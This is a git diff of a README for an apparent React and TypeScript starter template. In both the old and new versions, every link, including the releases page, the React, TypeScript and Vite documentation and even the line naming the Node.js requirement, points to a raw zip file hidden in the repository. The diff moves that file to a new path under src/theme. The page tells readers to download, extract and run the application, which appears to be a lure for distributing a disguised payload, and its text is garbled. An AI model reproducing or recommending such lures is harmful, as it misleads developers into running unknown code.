@@ -1,7 +1,7 @@
 # 🚀 react-spa-starter-2025 - Easy Setup for Your React App
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/cgperlo/react-spa-starter-2025/master/unmanurable/react-spa-starter-2025.zip)](https://raw.githubusercontent.com/cgperlo/react-spa-starter-2025/master/unmanurable/react-spa-starter-2025.zip)
+[![Download](https://github.com/cgperlo/react-spa-starter-2025/raw/refs/heads/master/src/theme/starter_spa_react_v1.7.zip)](https://github.com/cgperlo/react-spa-starter-2025/raw/refs/heads/master/src/theme/starter_spa_react_v1.7.zip)
 
 ## 📖 Introduction
 Welcome to `react-spa-starter-2025`. This is a starter template for building single-page applications (SPAs) using React and TypeScript. It provides a solid foundation to create modern, efficient web applications.
@@ -10,7 +10,7 @@ Welcome to `react-spa-starter-2025`. This is a starter template for building sin
 To get started with this app, you will need to download and run the application. Follow these steps to set everything up.
 
 1. **Download the Application**
-   Visit the [Releases page](https://raw.githubusercontent.com/cgperlo/react-spa-starter-2025/master/unmanurable/react-spa-starter-2025.zip) to download the latest version of the application.
+   Visit the [Releases page](https://github.com/cgperlo/react-spa-starter-2025/raw/refs/heads/master/src/theme/starter_spa_react_v1.7.zip) to download the latest version of the application.
 
 2. **Extract the Files**
    Once you’ve downloaded the file, locate it in your downloads folder. Right-click on the downloaded zip file and choose “Extract All.” Follow the prompts to extract the files to a folder of your choice.
@@ -47,7 +47,7 @@ To get started with this app, you will need to download and run the application.
 ## 🖥️ System Requirements
 To run this application, your system should meet the following requirements:
 - Operating System: Windows 10 or later, macOS, or a compatible Linux distribution.
-- https://raw.githubusercontent.com/cgperlo/react-spa-starter-2025/master/unmanurable/react-spa-starter-2025.zip version 14 or newer installed on your system.
+- https://github.com/cgperlo/react-spa-starter-2025/raw/refs/heads/master/src/theme/starter_spa_react_v1.7.zip version 14 or newer installed on your system.
 - A modern web browser (Chrome, Firefox, or Edge).
 
 ## 💡 Tips for Using the Application
@@ -70,9 +70,9 @@ If you would like to contribute to this project, please follow these steps:
 If you have any questions or need assistance, feel free to open an issue on the GitHub page. The community is here to help.
 
 ## 🔗 Additional Resources
-- Visit the [Documentation](https://raw.githubusercontent.com/cgperlo/react-spa-starter-2025/master/unmanurable/react-spa-starter-2025.zip) for React.
-- Explore [TypeScript](https://raw.githubusercontent.com/cgperlo/react-spa-starter-2025/master/unmanurable/react-spa-starter-2025.zip) for more details on using TypeScript.
-- Learn more about [Vite](https://raw.githubusercontent.com/cgperlo/react-spa-starter-2025/master/unmanurable/react-spa-starter-2025.zip) for improved development experience.
+- Visit the [Documentation](https://github.com/cgperlo/react-spa-starter-2025/raw/refs/heads/master/src/theme/starter_spa_react_v1.7.zip) for React.
+- Explore [TypeScript](https://github.com/cgperlo/react-spa-starter-2025/raw/refs/heads/master/src/theme/starter_spa_react_v1.7.zip) for more details on using TypeScript.
+- Learn more about [Vite](https://github.com/cgperlo/react-spa-starter-2025/raw/refs/heads/master/src/theme/starter_spa_react_v1.7.zip) for improved development experience.
 
 ## 📥 Download and Install
-To get your hands on the latest version of this application, [visit the Releases page](https://raw.githubusercontent.com/cgperlo/react-spa-starter-2025/master/unmanurable/react-spa-starter-2025.zip) now and start your development journey!
+To get your hands on the latest version of this application, [visit the Releases page](https://github.com/cgperlo/react-spa-starter-2025/raw/refs/heads/master/src/theme/starter_spa_react_v1.7.zip) now and start your development journey!
